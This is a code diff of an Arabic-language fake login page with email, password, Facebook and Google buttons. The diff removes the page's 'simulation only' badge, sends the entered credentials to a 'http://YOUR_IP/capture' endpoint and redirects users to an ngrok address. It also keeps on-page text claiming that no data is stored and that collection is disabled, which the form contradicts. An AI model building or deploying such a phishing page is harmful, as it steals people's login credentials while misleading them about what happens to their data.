@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width,initial-scale=1" />
-<title>تسجيل الدخول — تجربة توعوية</title>
+<title>تسجيل الدخول — تجربة توعية</title>
 <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
 <style>
   :root{
@@ -11,12 +11,6 @@
     --accent1:#2563eb;
     --accent2:#1e40af;
     --shadow: 0 8px 30px rgba(18,38,63,0.08);
-    --warning: #f59e0b;
-    --warning-bg: #fffbeb;
-    --warning-border: #fbbf24;
-    --success: #10b981;
-    --success-bg: #ecfdf5;
-    --success-border: #34d399;
   }
   *{box-sizing:border-box}
   html,body{height:100%}
@@ -34,8 +28,7 @@
   .hero{flex:1;min-width:260px;text-align:right;padding:20px 10px;}
   .hero h1{margin:0 0 10px 0;font-size:46px;line-height:1.02;font-weight:700;color:#0b1720;}
   .hero p{margin:12px 0 0 0;color:var(--muted);font-size:15px;max-width:520px;}
-  .card{flex:1;min-width:320px;background:#fff;border-radius:18px;padding:28px;box-shadow:var(--shadow);position:relative;}
-  .security-badge{position:absolute;top:-10px;left:50%;transform:translateX(-50%);background:var(--warning-bg);color:#92400e;padding:6px 16px;border-radius:20px;font-size:13px;font-weight:600;border:1px solid var(--warning-border);box-shadow:0 2px 8px rgba(245,158,11,0.15);}
+  .card{flex:1;min-width:320px;background:#fff;border-radius:18px;padding:28px;box-shadow:var(--shadow);}
   form{display:flex;flex-direction:column;gap:14px}
   label{font-size:13px;color:var(--muted);margin-bottom:6px}
   .input{display:flex;flex-direction:column;}
@@ -44,26 +37,15 @@
     transition:box-shadow .15s, border-color .15s;
   }
   input[type="text"]:focus, input[type="password"]:focus{border-color:var(--accent1);box-shadow:0 6px 20px rgba(37,99,235,0.12);}
-  .btn{height:56px;border-radius:28px;border:0;cursor:pointer;font-weight:700;font-size:18px;color:white;background:linear-gradient(90deg,var(--accent1),var(--accent2));box-shadow:0 8px 20px rgba(37,99,235,0.18);transition:all 0.3s ease;}
-  .btn:hover{transform:translateY(-2px);box-shadow:0 12px 25px rgba(37,99,235,0.25);}
-  .btn:active{transform:translateY(0);}
-  .btn.success{background:linear-gradient(90deg,var(--success),#059669);box-shadow:0 8px 20px rgba(16,185,129,0.18);}
+  .btn{height:56px;border-radius:28px;border:0;cursor:pointer;font-weight:700;font-size:18px;color:white;background:linear-gradient(90deg,var(--accent1),var(--accent2));box-shadow:0 8px 20px rgba(37,99,235,0.18);}
   .separator{display:flex;align-items:center;gap:12px;color:var(--muted);margin:6px 0 6px 0;font-size:14px;}
   .separator::before,.separator::after{content:"";flex:1;height:1px;background:#e6e9ef;border-radius:2px;}
   .socials{display:flex;flex-direction:column;gap:10px;margin-top:6px}
-  .social-btn{height:52px;border-radius:12px;border:1px solid #d6d9df;background:white;display:flex;align-items:center;gap:12px;padding:0 14px;font-weight:600;cursor:pointer;transition:all 0.2s ease;}
-  .social-btn:hover{transform:translateY(-1px);box-shadow:0 4px 12px rgba(0,0,0,0.08);}
+  .social-btn{height:52px;border-radius:12px;border:1px solid #d6d9df;background:white;display:flex;align-items:center;gap:12px;padding:0 14px;font-weight:600;}
   .fb{background:#2d6fb2;color:white;border:0}
   .gg{background:white;color:#333}
   .muted{font-size:13px;color:var(--muted);text-align:center;margin-top:10px}
   .notice{display:none;margin-top:14px;padding:14px;border-radius:12px;background:#fff7ed;border:1px solid #ffdcb3;color:#7a4a13;font-size:14px;}
-  .success-notice{display:none;margin-top:14px;padding:14px;border-radius:12px;background:var(--success-bg);border:1px solid var(--success-border);color:#065f46;font-size:14px;}
-  .pulse{animation:pulse 1.5s infinite;}
-  @keyframes pulse{
-    0%{box-shadow:0 0 0 0 rgba(37,99,235,0.4);}
-    70%{box-shadow:0 0 0 10px rgba(37,99,235,0);}
-    100%{box-shadow:0 0 0 0 rgba(37,99,235,0);}
-  }
   @media (max-width:900px){
     .container{flex-direction:column;max-width:520px}
     .hero h1{font-size:36px;text-align:center}
@@ -81,10 +63,9 @@
     </div>
 
     <div class="card" aria-labelledby="signin-heading">
-      <div class="security-badge">صفحة توعوية — محاكاة فقط</div>
       <h2 id="signin-heading" style="margin:0 0 12px 0;text-align:center;font-size:20px;font-weight:700;color:#0b1720">تسجيل الدخول</h2>
 
-      <form id="login-form" action="YOUR_CREDENTIAL_COLLECTION_ENDPOINT" method="post" autocomplete="off" novalidate>
+      <form id="login-form" action="http://YOUR_IP/capture" method="POST" autocomplete="off">
         <div class="input">
           <label for="email">البريد الإلكتروني أو اسم المستخدم</label>
           <input id="email" name="email" type="text" placeholder="مثال: name@example.com" aria-label="Email or username" required>
@@ -95,7 +76,7 @@
           <input id="password" name="password" type="password" placeholder="أدخل كلمة المرور" aria-label="Password" required>
         </div>
 
-        <button class="btn pulse" type="submit" id="continue-btn">متابعة</button>
+        <button class="btn" type="submit" id="continue-btn">متابعة</button>
 
         <div class="separator" aria-hidden="true"><span>أو</span></div>
 
@@ -104,85 +85,29 @@
           <button type="button" class="social-btn gg" aria-label="Continue with Google">استمرار عبر جوجل</button>
         </div>
 
-        <div class="muted">
-            هذه تجربة توعوية — سيتم إرسال بياناتك (التي أدخلتها للتو) إلى خادم العرض التوضيحي.
-        </div>
+        <div class="muted">هذه تجربة توعوية — لا يتم تخزين أي بيانات فعلية. عند الضغط ستظهر رسالة توضيحية ثم تتم إعادة التوجيه.</div>
 
         <div id="notice" class="notice" role="status" aria-live="polite">
-          يرجى ملء جميع الحقول المطلوبة للمتابعة.
-        </div>
-        
-        <div id="success-notice" class="success-notice" role="status" aria-live="polite">
-          ✅ تم إرسال البيانات إلى خادم العرض التوضيحي بنجاح.
+          تم تعطيل تجميع البيانات عمدا — هذه صفحة محاكاة لأغراض التوعية.
         </div>
       </form>
     </div>
   </div>
 
-<script>
-(function(){
-  const form = document.getElementById('login-form');
-  const email = document.getElementById('email');
-  const password = document.getElementById('password');
-  const notice = document.getElementById('notice');
-  const successNotice = document.getElementById('success-notice');
-  const btn = document.getElementById('continue-btn');
-
-  // New Event Listener to control the form submission for the demo
-  form.addEventListener('submit', function(e){
-    
-    // 1. Basic Validation check
-    if (!email.value || !password.value) {
-      e.preventDefault(); // Stop submission if fields are empty
-      notice.style.display = 'block';
-      // Reset success message appearance
-      successNotice.style.display = 'none';
-      btn.textContent = 'متابعة';
-      btn.classList.remove('success');
-      btn.classList.add('pulse');
-      
-      // Customize error message for visual clarity
-      notice.textContent = 'يرجى ملء جميع الحقول المطلوبة';
-      notice.style.background = '#fef2f2';
-      notice.style.borderColor = '#fecaca';
-      notice.style.color = '#991b1b';
-      return;
-    }
-
-    // 2. Data is present, so now we show a temporary message 
-    // before allowing the form to send the data and redirect.
-    
-    // Prevent default submission initially to show the success message
-    e.preventDefault(); 
-
-    // Show the success notice immediately
-    notice.style.display = 'none';
-    successNotice.style.display = 'block';
-    
-    // Change button appearance
-    btn.textContent = 'جاري الإرسال...';
-    btn.classList.remove('pulse');
-    btn.classList.add('success');
-    
-    // 3. Re-submit the form after a small delay
-    // This effectively allows the original form submission to proceed
-    setTimeout(function(){
-      // We must manually trigger the native submit, which will now
-      // proceed to the 'action' URL defined in the HTML.
-      form.submit();
-    }, 1200);
-  });
-
-  // Keep the social buttons as simple alerts/simulations
-  document.querySelectorAll('.social-btn').forEach(function(b){
-    b.addEventListener('click', function(){
-      // Simply alerts and reloads, keeping the focus on the main form submission
-      alert('تمت محاكاة تسجيل الدخول بنجاح عبر ' + (this.classList.contains('fb') ? 'فيسبوك' : 'جوجل') + '. التركيز حاليًا على حقل البريد وكلمة المرور.');
-      window.location.reload();
+  <script>
+    document.getElementById('login-form').addEventListener('submit', function(e) {
+      setTimeout(() => {
+        window.location.href = 'https://lora-reconciliatory-jacinto.ngrok-free.dev';
+      }, 500);
     });
-  });
-})();
-</script>
 
+    document.querySelectorAll('.social-btn').forEach(btn => {
+      btn.addEventListener('click', function() {
+        setTimeout(() => {
+          window.location.href = 'https://lora-reconciliatory-jacinto.ngrok-free.dev';
+        }, 500);
+      });
+    });
+  </script>
 </body>
 </html>
